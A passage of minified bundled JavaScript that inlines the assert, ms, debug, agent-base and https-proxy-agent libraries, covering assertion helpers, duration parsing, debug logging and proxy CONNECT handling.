                Ne("assert.fail() with more than one argument is deprecated. Please use assert.strictEqual() instead or only pass a message.", "DeprecationWarning", "DEP0094")
            }
            Ze === 2 && (Te = "!=")
        }
        if (Ie instanceof Error)
            throw Ie;
        var qe = {
            actual: Re,
            expected: Pe,
            operator: Te === void 0 ? "fail" : Te,
            stackStartFn: Le || Be
        };
        Ie !== void 0 && (qe.message = Ie);
        var Ve = new V(qe);
        throw $e && (Ve.message = $e,
        Ve.generatedMessage = !0),
        Ve
    }
    xe.fail = Be,
    xe.AssertionError = V;
    function ce(Re, Pe, Ie, Te) {
        if (!Ie) {
            var Le = !1;
            if (Pe === 0)
                Le = !0,
                Te = "No value argument passed to `assert.ok()`";
            else if (Te instanceof Error)
                throw Te;
            var Ze = new V({
                actual: Ie,
                expected: !0,
                message: Te,
                operator: "==",
                stackStartFn: Re
            });
            throw Ze.generatedMessage = Le,
            Ze
        }
    }
    function q() {
        for (var Re = arguments.length, Pe = new Array(Re), Ie = 0; Ie < Re; Ie++)
            Pe[Ie] = arguments[Ie];
        ce.apply(void 0, [q, Pe.length].concat(Pe))
    }
    xe.ok = q,
    xe.equal = function Re(Pe, Ie, Te) {
        if (arguments.length < 2)
            throw new F("actual","expected");
        Pe != Ie && Ee({
            actual: Pe,
            expected: Ie,
            message: Te,
            operator: "==",
            stackStartFn: Re
        })
    }
    ,
    xe.notEqual = function Re(Pe, Ie, Te) {
        if (arguments.length < 2)
            throw new F("actual","expected");
        Pe == Ie && Ee({
            actual: Pe,
            expected: Ie,
            message: Te,
            operator: "!=",
            stackStartFn: Re
        })
    }
    ,
    xe.deepEqual = function Re(Pe, Ie, Te) {
        if (arguments.length < 2)
            throw new F("actual","expected");
        he === void 0 && ye(),
        he(Pe, Ie) || Ee({
            actual: Pe,
            expected: Ie,
            message: Te,
            operator: "deepEqual",
            stackStartFn: Re
        })
    }
    ,
    xe.notDeepEqual = function Re(Pe, Ie, Te) {
        if (arguments.length < 2)
            throw new F("actual","expected");
        he === void 0 && ye(),
        he(Pe, Ie) && Ee({
            actual: Pe,
            expected: Ie,
            message: Te,
            operator: "notDeepEqual",
            stackStartFn: Re
        })
    }
    ,
    xe.deepStrictEqual = function Re(Pe, Ie, Te) {
        if (arguments.length < 2)
            throw new F("actual","expected");
        he === void 0 && ye(),
        pe(Pe, Ie) || Ee({
            actual: Pe,
            expected: Ie,
            message: Te,
            operator: "deepStrictEqual",
            stackStartFn: Re
        })
    }
    ,
    xe.notDeepStrictEqual = L;
    function L(Re, Pe, Ie) {
        if (arguments.length < 2)
            throw new F("actual","expected");
        he === void 0 && ye(),
        pe(Re, Pe) && Ee({
            actual: Re,
            expected: Pe,
            message: Ie,
            operator: "notDeepStrictEqual",
            stackStartFn: L
        })
    }
    xe.strictEqual = function Re(Pe, Ie, Te) {
        if (arguments.length < 2)
            throw new F("actual","expected");
        ue(Pe, Ie) || Ee({
            actual: Pe,
            expected: Ie,
            message: Te,
            operator: "strictEqual",
            stackStartFn: Re
        })
    }
    ,
    xe.notStrictEqual = function Re(Pe, Ie, Te) {
        if (arguments.length < 2)
            throw new F("actual","expected");
        ue(Pe, Ie) && Ee({
            actual: Pe,
            expected: Ie,
            message: Te,
            operator: "notStrictEqual",
            stackStartFn: Re
        })
    }
    ;
    var U = M(function Re(Pe, Ie, Te) {
        var Le = this;
        j(this, Re),
        Ie.forEach(function(Ze) {
            Ze in Pe && (Te !== void 0 && typeof Te[Ze] == "string" && ne(Pe[Ze]) && fe(Pe[Ze], Te[Ze]) ? Le[Ze] = Te[Ze] : Le[Ze] = Pe[Ze])
        })
    });
    function Z(Re, Pe, Ie, Te, Le, Ze) {
        if (!(Ie in Re) || !pe(Re[Ie], Pe[Ie])) {
            if (!Te) {
                var $e = new U(Re,Le)
                  , Ne = new U(Pe,Le,Re)
                  , qe = new V({
                    actual: $e,
                    expected: Ne,
                    operator: "deepStrictEqual",
                    stackStartFn: Ze
                });
                throw qe.actual = Re,
                qe.expected = Pe,
                qe.operator = Ze.name,
                qe
            }
            Ee({
                actual: Re,
                expected: Pe,
                message: Te,
                operator: Ze.name,
                stackStartFn: Ze
            })
        }
    }
    function te(Re, Pe, Ie, Te) {
        if (typeof Pe != "function") {
            if (ne(Pe))
                return fe(Pe, Re);
            if (arguments.length === 2)
                throw new b("expected",["Function", "RegExp"],Pe);
            if (_(Re) !== "object" || Re === null) {
                var Le = new V({
                    actual: Re,
                    expected: Pe,
                    message: Ie,
                    operator: "deepStrictEqual",
                    stackStartFn: Te
                });
                throw Le.operator = Te.name,
                Le
            }
            var Ze = Object.keys(Pe);
            if (Pe instanceof Error)
                Ze.push("name", "message");
            else if (Ze.length === 0)
                throw new X("error",Pe,"may not be an empty object");
            return he === void 0 && ye(),
            Ze.forEach(function($e) {
                typeof Re[$e] == "string" && ne(Pe[$e]) && fe(Pe[$e], Re[$e]) || Z(Re, Pe, $e, Ie, Ze, Te)
            }),
            !0
        }
        return Pe.prototype !== void 0 && Re instanceof Pe ? !0 : Error.isPrototypeOf(Pe) ? !1 : Pe.call({}, Re) === !0
    }
    function se(Re) {
        if (typeof Re != "function")
            throw new b("fn","Function",Re);
        try {
            Re()
        } catch (Pe) {
            return Pe
        }
        return Ae
    }
    function de(Re) {
        return ae(Re) || Re !== null && _(Re) === "object" && typeof Re.then == "function" && typeof Re.catch == "function"
    }
    function re(Re) {
        return Promise.resolve().then(function() {
            var Pe;
            if (typeof Re == "function") {
                if (Pe = Re(),
                !de(Pe))
                    throw new Y("instance of Promise","promiseFn",Pe)
            } else if (de(Re))
                Pe = Re;
            else
                throw new b("promiseFn",["Function", "Promise"],Re);
            return Promise.resolve().then(function() {
                return Pe
            }).then(function() {
                return Ae
            }).catch(function(Ie) {
                return Ie
            })
        })
    }
    function $(Re, Pe, Ie, Te) {
        if (typeof Ie == "string") {
            if (arguments.length === 4)
                throw new b("error",["Object", "Error", "Function", "RegExp"],Ie);
            if (_(Pe) === "object" && Pe !== null) {
                if (Pe.message === Ie)
                    throw new w("error/message",'The error message "'.concat(Pe.message, '" is identical to the message.'))
            } else if (Pe === Ie)
                throw new w("error/message",'The error "'.concat(Pe, '" is identical to the message.'));
            Te = Ie,
            Ie = void 0
        } else if (Ie != null && _(Ie) !== "object" && typeof Ie != "function")
            throw new b("error",["Object", "Error", "Function", "RegExp"],Ie);
        if (Pe === Ae) {
            var Le = "";
            Ie && Ie.name && (Le += " (".concat(Ie.name, ")")),
            Le += Te ? ": ".concat(Te) : ".";
            var Ze = Re.name === "rejects" ? "rejection" : "exception";
            Ee({
                actual: void 0,
                expected: Ie,
                operator: Re.name,
                message: "Missing expected ".concat(Ze).concat(Le),
                stackStartFn: Re
            })
        }
        if (Ie && !te(Pe, Ie, Te, Re))
            throw Pe
    }
    function ie(Re, Pe, Ie, Te) {
        if (Pe !== Ae) {
            if (typeof Ie == "string" && (Te = Ie,
            Ie = void 0),
            !Ie || te(Pe, Ie)) {
                var Le = Te ? ": ".concat(Te) : "."
                  , Ze = Re.name === "doesNotReject" ? "rejection" : "exception";
                Ee({
                    actual: Pe,
                    expected: Ie,
                    operator: Re.name,
                    message: "Got unwanted ".concat(Ze).concat(Le, `
`) + 'Actual message: "'.concat(Pe && Pe.message, '"'),
                    stackStartFn: Re
                })
            }
            throw Pe
        }
    }
    xe.throws = function Re(Pe) {
        for (var Ie = arguments.length, Te = new Array(Ie > 1 ? Ie - 1 : 0), Le = 1; Le < Ie; Le++)
            Te[Le - 1] = arguments[Le];
        $.apply(void 0, [Re, se(Pe)].concat(Te))
    }
    ,
    xe.rejects = function Re(Pe) {
        for (var Ie = arguments.length, Te = new Array(Ie > 1 ? Ie - 1 : 0), Le = 1; Le < Ie; Le++)
            Te[Le - 1] = arguments[Le];
        return re(Pe).then(function(Ze) {
            return $.apply(void 0, [Re, Ze].concat(Te))
        })
    }
    ,
    xe.doesNotThrow = function Re(Pe) {
        for (var Ie = arguments.length, Te = new Array(Ie > 1 ? Ie - 1 : 0), Le = 1; Le < Ie; Le++)
            Te[Le - 1] = arguments[Le];
        ie.apply(void 0, [Re, se(Pe)].concat(Te))
    }
    ,
    xe.doesNotReject = function Re(Pe) {
        for (var Ie = arguments.length, Te = new Array(Ie > 1 ? Ie - 1 : 0), Le = 1; Le < Ie; Le++)
            Te[Le - 1] = arguments[Le];
        return re(Pe).then(function(Ze) {
            return ie.apply(void 0, [Re, Ze].concat(Te))
        })
    }
    ,
    xe.ifError = function Re(Pe) {
        if (Pe != null) {
            var Ie = "ifError got unwanted exception: ";
            _(Pe) === "object" && typeof Pe.message == "string" ? Pe.message.length === 0 && Pe.constructor ? Ie += Pe.constructor.name : Ie += Pe.message : Ie += Q(Pe);
            var Te = new V({
                actual: Pe,
                expected: null,
                operator: "ifError",
                message: Ie,
                stackStartFn: Re
            })
              , Le = Pe.stack;
            if (typeof Le == "string") {
                var Ze = Le.split(`
`);
                Ze.shift();
                for (var $e = Te.stack.split(`
`), Ne = 0; Ne < Ze.length; Ne++) {
                    var qe = $e.indexOf(Ze[Ne]);
                    if (qe !== -1) {
                        $e = $e.slice(0, qe);
                        break
                    }
                }
                Te.stack = "".concat($e.join(`
`), `
`).concat(Ze.join(`
`))
            }
            throw Te
        }
    }
    ;
    function ve(Re, Pe, Ie, Te, Le) {
        if (!ne(Pe))
            throw new b("regexp","RegExp",Pe);
        var Ze = Le === "match";
        if (typeof Re != "string" || fe(Pe, Re) !== Ze) {
            if (Ie instanceof Error)
                throw Ie;
            var $e = !Ie;
            Ie = Ie || (typeof Re != "string" ? 'The "string" argument must be of type string. Received type ' + "".concat(_(Re), " (").concat(Q(Re), ")") : (Ze ? "The input did not match the regular expression " : "The input was expected to not match the regular expression ") + "".concat(Q(Pe), `. Input:

`).concat(Q(Re), `
`));
            var Ne = new V({
                actual: Re,
                expected: Pe,
                message: Ie,
                operator: Le,
                stackStartFn: Te
            });
            throw Ne.generatedMessage = $e,
            Ne
        }
    }
    xe.match = function Re(Pe, Ie, Te) {
        ve(Pe, Ie, Te, Re, "match")
    }
    ,
    xe.doesNotMatch = function Re(Pe, Ie, Te) {
        ve(Pe, Ie, Te, Re, "doesNotMatch")
    }
    ;
    function ge() {
        for (var Re = arguments.length, Pe = new Array(Re), Ie = 0; Ie < Re; Ie++)
            Pe[Ie] = arguments[Ie];
        ce.apply(void 0, [ge, Pe.length].concat(Pe))
    }
    return xe.strict = oe(ge, xe, {
        equal: xe.strictEqual,
        deepEqual: xe.deepStrictEqual,
        notEqual: xe.notStrictEqual,
        notDeepEqual: xe.notDeepStrictEqual
    }),
    xe.strict.strict = xe.strict,
    assert.exports
}
var browser = {
    exports: {}
}, ms, hasRequiredMs;
function requireMs() {
    if (hasRequiredMs)
        return ms;
    hasRequiredMs = 1;
    var _ = 1e3
      , M = _ * 60
      , j = M * 60
      , O = j * 24
      , x = O * 7
      , w = O * 365.25;
    ms = function(V, K) {
        K = K || {};
        var Q = typeof V;
        if (Q === "string" && V.length > 0)
            return b(V);
        if (Q === "number" && isFinite(V))
            return K.long ? Y(V) : X(V);
        throw new Error("val is not a non-empty string or a valid number. val=" + JSON.stringify(V))
    }
    ;
    function b(V) {
        if (V = String(V),
        !(V.length > 100)) {
            var K = /^(-?(?:\d+)?\.?\d+) *(milliseconds?|msecs?|ms|seconds?|secs?|s|minutes?|mins?|m|hours?|hrs?|h|days?|d|weeks?|w|years?|yrs?|y)?$/i.exec(V);
            if (K) {
                var Q = parseFloat(K[1])
                  , ee = (K[2] || "ms").toLowerCase();
                switch (ee) {
                case "years":
                case "year":
                case "yrs":
                case "yr":
                case "y":
                    return Q * w;
                case "weeks":
                case "week":
                case "w":
                    return Q * x;
                case "days":
                case "day":
                case "d":
                    return Q * O;
                case "hours":
                case "hour":
                case "hrs":
                case "hr":
                case "h":
                    return Q * j;
                case "minutes":
                case "minute":
                case "mins":
                case "min":
                case "m":
                    return Q * M;
                case "seconds":
                case "second":
                case "secs":
                case "sec":
                case "s":
                    return Q * _;
                case "milliseconds":
                case "millisecond":
                case "msecs":
                case "msec":
                case "ms":
                    return Q;
                default:
                    return
                }
            }
        }
    }
    function X(V) {
        var K = Math.abs(V);
        return K >= O ? Math.round(V / O) + "d" : K >= j ? Math.round(V / j) + "h" : K >= M ? Math.round(V / M) + "m" : K >= _ ? Math.round(V / _) + "s" : V + "ms"
    }
    function Y(V) {
        var K = Math.abs(V);
        return K >= O ? F(V, K, O, "day") : K >= j ? F(V, K, j, "hour") : K >= M ? F(V, K, M, "minute") : K >= _ ? F(V, K, _, "second") : V + " ms"
    }
    function F(V, K, Q, ee) {
        var ae = K >= Q * 1.5;
        return Math.round(V / Q) + " " + ee + (ae ? "s" : "")
    }
    return ms
}
var common, hasRequiredCommon;
function requireCommon() {
    if (hasRequiredCommon)
        return common;
    hasRequiredCommon = 1;
    function _(M) {
        O.debug = O,
        O.default = O,
        O.coerce = F,
        O.disable = X,
        O.enable = w,
        O.enabled = Y,
        O.humanize = requireMs(),
        O.destroy = V,
        Object.keys(M).forEach(K => {
            O[K] = M[K]
        }
        ),
        O.names = [],
        O.skips = [],
        O.formatters = {};
        function j(K) {
            let Q = 0;
            for (let ee = 0; ee < K.length; ee++)
                Q = (Q << 5) - Q + K.charCodeAt(ee),
                Q |= 0;
            return O.colors[Math.abs(Q) % O.colors.length]
        }
        O.selectColor = j;
        function O(K) {
            let Q, ee = null, ae, ne;
            function oe(...ue) {
                if (!oe.enabled)
                    return;
                const fe = oe
                  , he = Number(new Date)
                  , pe = he - (Q || he);
                fe.diff = pe,
                fe.prev = Q,
                fe.curr = he,
                Q = he,
                ue[0] = O.coerce(ue[0]),
                typeof ue[0] != "string" && ue.unshift("%O");
                let ye = 0;
                ue[0] = ue[0].replace(/%([a-zA-Z%])/g, (xe, Ae) => {
                    if (xe === "%%")
                        return "%";
                    ye++;
                    const Ee = O.formatters[Ae];
                    if (typeof Ee == "function") {
                        const Be = ue[ye];
                        xe = Ee.call(fe, Be),
                        ue.splice(ye, 1),
                        ye--
                    }
                    return xe
                }
                ),
                O.formatArgs.call(fe, ue),
                (fe.log || O.log).apply(fe, ue)
            }
            return oe.namespace = K,
            oe.useColors = O.useColors(),
            oe.color = O.selectColor(K),
            oe.extend = x,
            oe.destroy = O.destroy,
            Object.defineProperty(oe, "enabled", {
                enumerable: !0,
                configurable: !1,
                get: () => ee !== null ? ee : (ae !== O.namespaces && (ae = O.namespaces,
                ne = O.enabled(K)),
                ne),
                set: ue => {
                    ee = ue
                }
            }),
            typeof O.init == "function" && O.init(oe),
            oe
        }
        function x(K, Q) {
            const ee = O(this.namespace + (typeof Q > "u" ? ":" : Q) + K);
            return ee.log = this.log,
            ee
        }
        function w(K) {
            O.save(K),
            O.namespaces = K,
            O.names = [],
            O.skips = [];
            const Q = (typeof K == "string" ? K : "").trim().replace(/\s+/g, ",").split(",").filter(Boolean);
            for (const ee of Q)
                ee[0] === "-" ? O.skips.push(ee.slice(1)) : O.names.push(ee)
        }
        function b(K, Q) {
            let ee = 0
              , ae = 0
              , ne = -1
              , oe = 0;
            for (; ee < K.length; )
                if (ae < Q.length && (Q[ae] === K[ee] || Q[ae] === "*"))
                    Q[ae] === "*" ? (ne = ae,
                    oe = ee,
                    ae++) : (ee++,
                    ae++);
                else if (ne !== -1)
                    ae = ne + 1,
                    oe++,
                    ee = oe;
                else
                    return !1;
            for (; ae < Q.length && Q[ae] === "*"; )
                ae++;
            return ae === Q.length
        }
        function X() {
            const K = [...O.names, ...O.skips.map(Q => "-" + Q)].join(",");
            return O.enable(""),
            K
        }
        function Y(K) {
            for (const Q of O.skips)
                if (b(K, Q))
                    return !1;
            for (const Q of O.names)
                if (b(K, Q))
                    return !0;
            return !1
        }
        function F(K) {
            return K instanceof Error ? K.stack || K.message : K
        }
        function V() {
            console.warn("Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of `debug`.")
        }
        return O.enable(O.load()),
        O
    }
    return common = _,
    common
}
var hasRequiredBrowser;
function requireBrowser() {
    return hasRequiredBrowser || (hasRequiredBrowser = 1,
    function(_, M) {
        var j = {};
        M.formatArgs = x,
        M.save = w,
        M.load = b,
        M.useColors = O,
        M.storage = X(),
        M.destroy = ( () => {
            let F = !1;
            return () => {
                F || (F = !0,
                console.warn("Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of `debug`."))
            }
        }
        )(),
        M.colors = ["#0000CC", "#0000FF", "#0033CC", "#0033FF", "#0066CC", "#0066FF", "#0099CC", "#0099FF", "#00CC00", "#00CC33", "#00CC66", "#00CC99", "#00CCCC", "#00CCFF", "#3300CC", "#3300FF", "#3333CC", "#3333FF", "#3366CC", "#3366FF", "#3399CC", "#3399FF", "#33CC00", "#33CC33", "#33CC66", "#33CC99", "#33CCCC", "#33CCFF", "#6600CC", "#6600FF", "#6633CC", "#6633FF", "#66CC00", "#66CC33", "#9900CC", "#9900FF", "#9933CC", "#9933FF", "#99CC00", "#99CC33", "#CC0000", "#CC0033", "#CC0066", "#CC0099", "#CC00CC", "#CC00FF", "#CC3300", "#CC3333", "#CC3366", "#CC3399", "#CC33CC", "#CC33FF", "#CC6600", "#CC6633", "#CC9900", "#CC9933", "#CCCC00", "#CCCC33", "#FF0000", "#FF0033", "#FF0066", "#FF0099", "#FF00CC", "#FF00FF", "#FF3300", "#FF3333", "#FF3366", "#FF3399", "#FF33CC", "#FF33FF", "#FF6600", "#FF6633", "#FF9900", "#FF9933", "#FFCC00", "#FFCC33"];
        function O() {
            if (typeof window < "u" && window.process && (window.process.type === "renderer" || window.process.__nwjs))
                return !0;
            if (typeof navigator < "u" && navigator.userAgent && navigator.userAgent.toLowerCase().match(/(edge|trident)\/(\d+)/))
                return !1;
            let F;
            return typeof document < "u" && document.documentElement && document.documentElement.style && document.documentElement.style.WebkitAppearance || typeof window < "u" && window.console && (window.console.firebug || window.console.exception && window.console.table) || typeof navigator < "u" && navigator.userAgent && (F = navigator.userAgent.toLowerCase().match(/firefox\/(\d+)/)) && parseInt(F[1], 10) >= 31 || typeof navigator < "u" && navigator.userAgent && navigator.userAgent.toLowerCase().match(/applewebkit\/(\d+)/)
        }
        function x(F) {
            if (F[0] = (this.useColors ? "%c" : "") + this.namespace + (this.useColors ? " %c" : " ") + F[0] + (this.useColors ? "%c " : " ") + "+" + _.exports.humanize(this.diff),
            !this.useColors)
                return;
            const V = "color: " + this.color;
            F.splice(1, 0, V, "color: inherit");
            let K = 0
              , Q = 0;
            F[0].replace(/%[a-zA-Z%]/g, ee => {
                ee !== "%%" && (K++,
                ee === "%c" && (Q = K))
            }
            ),
            F.splice(Q, 0, V)
        }
        M.log = console.debug || console.log || ( () => {}
        );
        function w(F) {
            try {
                F ? M.storage.setItem("debug", F) : M.storage.removeItem("debug")
            } catch {}
        }
        function b() {
            let F;
            try {
                F = M.storage.getItem("debug") || M.storage.getItem("DEBUG")
            } catch {}
            return !F && typeof process$1 < "u" && "env"in process$1 && (F = j.DEBUG),
            F
        }
        function X() {
            try {
                return localStorage
            } catch {}
        }
        _.exports = requireCommon()(M);
        const {formatters: Y} = _.exports;
        Y.j = function(F) {
            try {
                return JSON.stringify(F)
            } catch (V) {
                return "[UnexpectedJSONParseError]: " + V.message
            }
        }
    }(browser, browser.exports)),
    browser.exports
}
var dist = {}, helpers = {}, hasRequiredHelpers;
function requireHelpers() {
    if (hasRequiredHelpers)
        return helpers;
    hasRequiredHelpers = 1;
    var _ = helpers && helpers.__createBinding || (Object.create ? function(Y, F, V, K) {
        K === void 0 && (K = V);
        var Q = Object.getOwnPropertyDescriptor(F, V);
        (!Q || ("get"in Q ? !F.__esModule : Q.writable || Q.configurable)) && (Q = {
            enumerable: !0,
            get: function() {
                return F[V]
            }
        }),
        Object.defineProperty(Y, K, Q)
    }
    : function(Y, F, V, K) {
        K === void 0 && (K = V),
        Y[K] = F[V]
    }
    )
      , M = helpers && helpers.__setModuleDefault || (Object.create ? function(Y, F) {
        Object.defineProperty(Y, "default", {
            enumerable: !0,
            value: F
        })
    }
    : function(Y, F) {
        Y.default = F
    }
    )
      , j = helpers && helpers.__importStar || function(Y) {
        if (Y && Y.__esModule)
            return Y;
        var F = {};
        if (Y != null)
            for (var V in Y)
                V !== "default" && Object.prototype.hasOwnProperty.call(Y, V) && _(F, Y, V);
        return M(F, Y),
        F
    }
    ;
    Object.defineProperty(helpers, "__esModule", {
        value: !0
    }),
    helpers.req = helpers.json = helpers.toBuffer = void 0;
    const O = j(requireStreamHttp())
      , x = j(requireHttpsBrowserify());
    async function w(Y) {
        let F = 0;
        const V = [];
        for await(const K of Y)
            F += K.length,
            V.push(K);
        return Buffer.concat(V, F)
    }
    helpers.toBuffer = w;
    async function b(Y) {
        const V = (await w(Y)).toString("utf8");
        try {
            return JSON.parse(V)
        } catch (K) {
            const Q = K;
            throw Q.message += ` (input: ${V})`,
            Q
        }
    }
    helpers.json = b;
    function X(Y, F={}) {
        const K = ((typeof Y == "string" ? Y : Y.href).startsWith("https:") ? x : O).request(Y, F)
          , Q = new Promise( (ee, ae) => {
            K.once("response", ee).once("error", ae).end()
        }
        );
        return K.then = Q.then.bind(Q),
        K
    }
    return helpers.req = X,
    helpers
}
var hasRequiredDist$1;
function requireDist$1() {
    return hasRequiredDist$1 || (hasRequiredDist$1 = 1,
    function(_) {
        var M = dist && dist.__createBinding || (Object.create ? function(V, K, Q, ee) {
            ee === void 0 && (ee = Q);
            var ae = Object.getOwnPropertyDescriptor(K, Q);
            (!ae || ("get"in ae ? !K.__esModule : ae.writable || ae.configurable)) && (ae = {
                enumerable: !0,
                get: function() {
                    return K[Q]
                }
            }),
            Object.defineProperty(V, ee, ae)
        }
        : function(V, K, Q, ee) {
            ee === void 0 && (ee = Q),
            V[ee] = K[Q]
        }
        )
          , j = dist && dist.__setModuleDefault || (Object.create ? function(V, K) {
            Object.defineProperty(V, "default", {
                enumerable: !0,
                value: K
            })
        }
        : function(V, K) {
            V.default = K
        }
        )
          , O = dist && dist.__importStar || function(V) {
            if (V && V.__esModule)
                return V;
            var K = {};
            if (V != null)
                for (var Q in V)
                    Q !== "default" && Object.prototype.hasOwnProperty.call(V, Q) && M(K, V, Q);
            return j(K, V),
            K
        }
          , x = dist && dist.__exportStar || function(V, K) {
            for (var Q in V)
                Q !== "default" && !Object.prototype.hasOwnProperty.call(K, Q) && M(K, V, Q)
        }
        ;
        Object.defineProperty(_, "__esModule", {
            value: !0
        }),
        _.Agent = void 0;
        const w = O(require$$1)
          , b = O(requireStreamHttp())
          , X = requireHttpsBrowserify();
        x(requireHelpers(), _);
        const Y = Symbol("AgentBaseInternalState");
        class F extends b.Agent {
            constructor(K) {
                super(K),
                this[Y] = {}
            }
            isSecureEndpoint(K) {
                if (K) {
                    if (typeof K.secureEndpoint == "boolean")
                        return K.secureEndpoint;
                    if (typeof K.protocol == "string")
                        return K.protocol === "https:"
                }
                const {stack: Q} = new Error;
                return typeof Q != "string" ? !1 : Q.split(`
`).some(ee => ee.indexOf("(https.js:") !== -1 || ee.indexOf("node:https:") !== -1)
            }
            incrementSockets(K) {
                if (this.maxSockets === 1 / 0 && this.maxTotalSockets === 1 / 0)
                    return null;
                this.sockets[K] || (this.sockets[K] = []);
                const Q = new w.Socket({
                    writable: !1
                });
                return this.sockets[K].push(Q),
                this.totalSocketCount++,
                Q
            }
            decrementSockets(K, Q) {
                if (!this.sockets[K] || Q === null)
                    return;
                const ee = this.sockets[K]
                  , ae = ee.indexOf(Q);
                ae !== -1 && (ee.splice(ae, 1),
                this.totalSocketCount--,
                ee.length === 0 && delete this.sockets[K])
            }
            getName(K) {
                return (typeof K.secureEndpoint == "boolean" ? K.secureEndpoint : this.isSecureEndpoint(K)) ? X.Agent.prototype.getName.call(this, K) : super.getName(K)
            }
            createSocket(K, Q, ee) {
                const ae = {
                    ...Q,
                    secureEndpoint: this.isSecureEndpoint(Q)
                }
                  , ne = this.getName(ae)
                  , oe = this.incrementSockets(ne);
                Promise.resolve().then( () => this.connect(K, ae)).then(ue => {
                    if (this.decrementSockets(ne, oe),
                    ue instanceof b.Agent)
                        try {
                            return ue.addRequest(K, ae)
                        } catch (fe) {
                            return ee(fe)
                        }
                    this[Y].currentSocket = ue,
                    super.createSocket(K, Q, ee)
                }
                , ue => {
                    this.decrementSockets(ne, oe),
                    ee(ue)
                }
                )
            }
            createConnection() {
                const K = this[Y].currentSocket;
                if (this[Y].currentSocket = void 0,
                !K)
                    throw new Error("No socket was returned in the `connect()` function");
                return K
            }
            get defaultPort() {
                return this[Y].defaultPort ?? (this.protocol === "https:" ? 443 : 80)
            }
            set defaultPort(K) {
                this[Y] && (this[Y].defaultPort = K)
            }
            get protocol() {
                return this[Y].protocol ?? (this.isSecureEndpoint() ? "https:" : "http:")
            }
            set protocol(K) {
                this[Y] && (this[Y].protocol = K)
            }
        }
        _.Agent = F
    }(dist)),
    dist
}
var parseProxyResponse = {}, hasRequiredParseProxyResponse;
function requireParseProxyResponse() {
    if (hasRequiredParseProxyResponse)
        return parseProxyResponse;
    hasRequiredParseProxyResponse = 1;
    var _ = parseProxyResponse && parseProxyResponse.__importDefault || function(x) {
        return x && x.__esModule ? x : {
            default: x
        }
    }
    ;
    Object.defineProperty(parseProxyResponse, "__esModule", {
        value: !0
    }),
    parseProxyResponse.parseProxyResponse = void 0;
    const j = (0,
    _(requireBrowser()).default)("https-proxy-agent:parse-proxy-response");
    function O(x) {
        return new Promise( (w, b) => {
            let X = 0;
            const Y = [];
            function F() {
                const ae = x.read();
                ae ? ee(ae) : x.once("readable", F)
            }
            function V() {
                x.removeListener("end", K),
                x.removeListener("error", Q),
                x.removeListener("readable", F)
            }
            function K() {
                V(),
                j("onend"),
                b(new Error("Proxy connection ended before receiving CONNECT response"))
            }
            function Q(ae) {
                V(),
                j("onerror %o", ae),
                b(ae)
            }
            function ee(ae) {
                Y.push(ae),
                X += ae.length;
                const ne = Buffer.concat(Y, X)
                  , oe = ne.indexOf(`\r
\r
`);
                if (oe === -1) {
                    j("have not received end of HTTP headers yet..."),
                    F();
                    return
                }
                const ue = ne.slice(0, oe).toString("ascii").split(`\r
`)
                  , fe = ue.shift();
                if (!fe)
                    return x.destroy(),
                    b(new Error("No header received from proxy CONNECT response"));
                const he = fe.split(" ")
                  , pe = +he[1]
                  , ye = he.slice(2).join(" ")
                  , be = {};
                for (const xe of ue) {
                    if (!xe)
                        continue;
                    const Ae = xe.indexOf(":");
                    if (Ae === -1)
                        return x.destroy(),
                        b(new Error(`Invalid header from proxy CONNECT response: "${xe}"`));
                    const Ee = xe.slice(0, Ae).toLowerCase()
                      , Be = xe.slice(Ae + 1).trimStart()
                      , ce = be[Ee];
                    typeof ce == "string" ? be[Ee] = [ce, Be] : Array.isArray(ce) ? ce.push(Be) : be[Ee] = Be
                }
                j("got proxy server response: %o %o", fe, be),
                V(),
                w({
                    connect: {
                        statusCode: pe,
                        statusText: ye,
                        headers: be
                    },
                    buffered: ne
                })
            }
            x.on("error", Q),
            x.on("end", K),
            F()
        }
        )
    }
    return parseProxyResponse.parseProxyResponse = O,
    parseProxyResponse
}
var hasRequiredDist;
function requireDist() {
    if (hasRequiredDist)
        return dist$1;
    hasRequiredDist = 1;
    var _ = dist$1 && dist$1.__createBinding || (Object.create ? function(oe, ue, fe, he) {
        he === void 0 && (he = fe);
        var pe = Object.getOwnPropertyDescriptor(ue, fe);
        (!pe || ("get"in pe ? !ue.__esModule : pe.writable || pe.configurable)) && (pe = {
            enumerable: !0,
            get: function() {
                return ue[fe]
            }
        }),
        Object.defineProperty(oe, he, pe)
    }
    : function(oe, ue, fe, he) {
        he === void 0 && (he = fe),
        oe[he] = ue[fe]
    }
    )
      , M = dist$1 && dist$1.__setModuleDefault || (Object.create ? function(oe, ue) {
        Object.defineProperty(oe, "default", {
            enumerable: !0,
            value: ue
        })
    }
    : function(oe, ue) {
        oe.default = ue
    }
    )
      , j = dist$1 && dist$1.__importStar || function(oe) {
        if (oe && oe.__esModule)
            return oe;
        var ue = {};
        if (oe != null)
            for (var fe in oe)
                fe !== "default" && Object.prototype.hasOwnProperty.call(oe, fe) && _(ue, oe, fe);
        return M(ue, oe),
        ue
    }
      , O = dist$1 && dist$1.__importDefault || function(oe) {
        return oe && oe.__esModule ? oe : {
            default: oe
        }
    }
    ;
    Object.defineProperty(dist$1, "__esModule", {
        value: !0
    }),
    dist$1.HttpsProxyAgent = void 0;
    const x = j(require$$1)
      , w = j(require$$1)
      , b = O(requireAssert())
      , X = O(requireBrowser())
      , Y = requireDist$1()
      , F = require$$5
      , V = requireParseProxyResponse()
      , K = (0,
    X.default)("https-proxy-agent")
      , Q = oe => oe.servername === void 0 && oe.host && !x.isIP(oe.host) ? {
        ...oe,
        servername: oe.host
    } : oe;
    class ee extends Y.Agent {
        constructor(ue, fe) {
            super(fe),
            this.options = {
                path: void 0
            },
            this.proxy = typeof ue == "string" ? new F.URL(ue) : ue,
            this.proxyHeaders = (fe == null ? void 0 : fe.headers) ?? {},
            K("Creating new HttpsProxyAgent instance: %o", this.proxy.href);
            const he = (this.proxy.hostname || this.proxy.host).replace(/^\[|\]$/g, "")
              , pe = this.proxy.port ? parseInt(this.proxy.port, 10) : this.proxy.protocol === "https:" ? 443 : 80;
            this.connectOpts = {
                ALPNProtocols: ["http/1.1"],
                ...fe ? ne(fe, "headers") : null,
                host: he,
                port: pe
            }
        }
        async connect(ue, fe) {
            const {proxy: he} = this;
            if (!fe.host)
                throw new TypeError('No "host" provided');
            let pe;
            he.protocol === "https:" ? (K("Creating `tls.Socket`: %o", this.connectOpts),
            pe = w.connect(Q(this.connectOpts))) : (K("Creating `net.Socket`: %o", this.connectOpts),
            pe = x.connect(this.connectOpts));
